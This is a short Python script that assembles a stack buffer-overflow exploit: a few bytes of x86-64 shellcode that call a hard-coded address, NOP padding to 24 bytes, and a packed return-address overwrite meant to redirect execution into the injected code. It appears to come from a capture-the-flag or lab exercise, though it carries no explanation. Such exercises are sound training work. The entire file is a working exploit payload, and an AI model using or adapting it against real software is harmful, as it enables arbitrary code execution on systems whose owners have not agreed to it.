import sys
import struct

code = bytes.fromhex("bf04 0000 0049 b887 1a40 0000 0000 0041 ffd0")
payload = (code + b"\x90" * (24 - len(code))
           + struct.pack("<Q", 0x721000800fd0) + b"\n")
sys.stdout.buffer.write(payload)
